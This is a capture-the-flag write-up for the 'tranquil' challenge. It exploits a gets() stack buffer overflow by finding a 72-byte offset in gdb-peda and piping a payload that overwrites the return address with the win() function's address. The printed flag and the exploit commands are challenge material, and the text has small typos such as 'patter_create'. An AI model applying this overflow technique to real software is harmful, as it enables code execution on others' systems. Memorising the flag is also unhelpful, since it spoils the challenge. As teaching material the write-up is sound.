# tranquil
## Description
Finally, [inner peace](/BINARY/tranquil/tranquil) - Master Oogway

[Source](/BINARY/tranquil/tranquil)

Connect with nc shell.actf.co 21830, or find it on the shell server at /problems/2021/tranquil.

Author: JoshDaBosh
### Hint
The compiler gives me a warning about gets... I wonder why.
## Approach
### Summary
Looking at the C source code, there is a section that uses the gets() function, and the win() function that reads flag.txt seems to be commented out and not executed.
Since the gets() function has a buffer overflow vulnerability, we can read flag.txt by overwriting the return address when the gets() function is executed with the win() function.
### Step 1
Use gdb-peda to find out the offset to the return address.

```
gdb ./tranquil
patter_create 100
```
Copy the pattern string created by the command to your clipboard.

```
r
<paste your clipboard>
```
Copy the pattern string displayed in the RSP Address field to your clipboard.

```
patto <paste your clip board>
```
Thus, we found out that the offset to the return address is 72 bytes.2
### Step 2
Find out the address of the win() function with gdb-peda.

```
x/s win
```
The address is "0x401196".
### Step 3
Input the attack string in tranquil.
Input "A" for the offset, and write the address of the win() function after them.
Don't forget to write the address in little-endian format.
In the shell,
```
echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x11\x40\x00" | ./tranquil
```
Then, we get the flag
## Flag
actf{time_has_gone_so_fast_watching_the_leaves_fall_from_our_instruction_pointer_864f647975d259d7a5bee6e1}
